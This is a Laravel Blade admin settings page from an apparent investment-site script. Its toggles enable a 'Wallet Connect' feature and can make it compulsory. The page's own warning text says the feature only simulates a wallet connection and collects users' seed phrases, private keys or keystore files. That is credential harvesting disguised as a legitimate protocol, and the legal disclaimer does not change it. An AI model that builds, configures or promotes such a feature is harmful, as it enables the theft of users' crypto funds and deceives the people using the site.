<div class="w-full p-5 mb-5 ts-gray-2 rounded-lg transition-all rescron-card" id="settings">
    <h3 class="capitalize  font-extrabold "><span class="border-b-2">Settings</span>
    </h3>




    <div class="w-full">
        <div class="grid grid-cols-1 gap-3 mt-5">


            <form action="{{ route('admin.wallet-connect.settings') }}" class="mt-5 gen-form"
                enctype="multipart/form-data" method="POST">
                @csrf

                <div class="grid grid-cols-1 gap-5">
                    <div class="relative ">
                        <div
                            class="w-full ts-gray-3 p-2 rounded-lg border border-slate-800 hover:border-slate-600 mb-5">

                            <p
                                class="text-xs text-red-500 brounded-lg border border-slate-800 hover:border-slate-600 mb-3 p-3 rounded-lg">
                                <span class="material-icons">error</span> This feature simulates a Wallet Connect. User
                                connect by entering their seed phrase, private key or keystore file. Ensure you have the
                                necessary legal permissions to collect and store such sensitive information from your
                                users. You are solely responsible for complying with all applicable laws and regulations regarding data
                                privacy and security and any liabilities that may arise from the collection and storage of such information.
                            </p>

                            
                            
                        </div>
                    </div>
                    
                    <div class="relative ">
                        <label for="wallet_connect_enabled" class="ts-font-bold mb-2">Enable Wallet Connect
                            Feature</label>
                        <select name="wallet_connect_enabled" id="wallet_connect_enabled"
                            class="w-full ts-gray-3 p-2 rounded-lg border border-slate-800 hover:border-slate-600">
                            <option value="1"
                                {{ site('wallet_connect_enabled') == 1 ? 'selected' : '' }}>Enabled</option>
                            <option value="0"
                                {{ site('wallet_connect_enabled') != 1 ? 'selected' : '' }}>Disabled</option>
                        </select>

                    </div>

                    <div class="relative ">
                        <label for="wallet_connect_compulsory" class="ts-font-bold mb-2">Make Wallet Connect Compulsory</label>
                        <select name="wallet_connect_compulsory" id="wallet_connect_compulsory"
                            class="w-full ts-gray-3 p-2 rounded-lg border border-slate-800 hover:border-slate-600">
                            <option value="1"
                                {{ site('wallet_connect_compulsory') == 1 ? 'selected' : '' }}>Enabled</option>
                            <option value="0"
                                {{ site('wallet_connect_compulsory') != 1 ? 'selected' : '' }}>Disabled</option>
                        </select>

                    </div>



                </div>





                <div class="w-full grid grid-cols-1 gap-5 mt-10 mb-10">
                    <button type="submit" class="bg-purple-500 px-2 py-1 rounded-full transition-all cursor-pointer">Save
                        Changes </button>
                </div>

            </form>




        </div>


    </div>

</div>



@push('scripts')
@endpush
